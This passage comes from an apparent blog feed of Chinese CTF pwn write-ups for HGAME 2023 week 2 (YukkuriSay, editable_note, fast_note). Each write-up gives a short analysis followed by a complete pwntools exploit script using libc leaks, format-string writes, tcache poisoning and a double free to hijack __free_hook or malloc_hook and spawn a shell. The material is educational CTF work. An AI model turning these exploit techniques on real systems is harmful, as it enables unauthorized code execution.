punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    rm<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span>cat<span class="token punctuation">(</span><span class="token string">'try7.txt'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1104</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseli<span class="token punctuation">(</span><span class="token string">'free_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basetouch<span class="token punctuation">(</span><span class="token string">'try8.txt'</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try11.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2023-week2-pwn</title>
      <link href="/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/"/>
      <url>/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>1.read不会设置缓冲区最后一个字节为’\0’ ，程序中将读取到的字符串回车改写为0，因此在输出字符串时若其中有残留地址则可泄露地址</p><p>2.gift中存在格式化字符串，但读取内容存在bss段，是非栈上的格式化字符串</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用循环中read泄露栈和libc地址</p><p>  （1）调试中下断点得到setbuf和栈到字符串的偏移</p><p>  （2）填充掉偏移部分直到所需泄露的地址，进行地址泄露</p><p>  （3）调试得到泄露到的地址和所需地址之间的偏移，直接在泄露的地址上进行加减</p><p> 2.布栈</p><p>  （1）输出ogg，在stack中找到最接近并且printf之后能运行到的地址，根据修改位数确定栈布局</p><p>3.利用格式化字符串进行任意地址写</p><p>   （1）调试中输入8个a，8个b，8个c，获取栈布局，利用fmt工具获取三个地址偏移</p><p>   （2）计算ogg低字节和低二三字节</p><p>   （3）用hhn写入单字节，hn写入双字节，实现任意地址写</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">32265</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xf8</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'What would you like to let Yukkri say?'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>setbuffer <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">204</span>libc_base <span class="token operator">=</span> setbuffer <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setbuffer'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x118</span> <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__libc_start_main  <span class="token operator">=</span> stack <span class="token operator">+</span>  <span class="token number">0x8</span>   <span class="token comment">#__libc_start_main + 24</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p3 <span class="token operator">=</span> p64<span class="token punctuation">(</span>__libc_start_main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__libc_start_main <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p3<span class="token punctuation">)</span>gadget1 <span class="token operator">=</span> gadget <span class="token operator">&amp;</span> <span class="token number">0xff</span>gadget2 <span class="token operator">=</span> <span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%8$hhn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">-</span> <span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%9$hn'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'gift for you: \n'</span><span class="token punctuation">,</span>p4<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system</p><p>2.利用UAF漏洞实现任意地址写，把free_hook改成system</p><p>3.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">30756</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>本题和上题的区别在于创建堆之后不能再修改，因此可以利用double free实现任意地址写</p><p>1.利用unsorted bin泄露libc，计算出ogg</p><p>2.创建两个堆并去释放形成double free</p><p>3.找malloc_hook最近能够绕过大小检查可作为chunk的地址，在该地址上创建堆并将malloc_hook改写为ogg</p><p>4.利用double free会触发mallo_hook的特点解决堆栈不平衡，触发ogg</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token 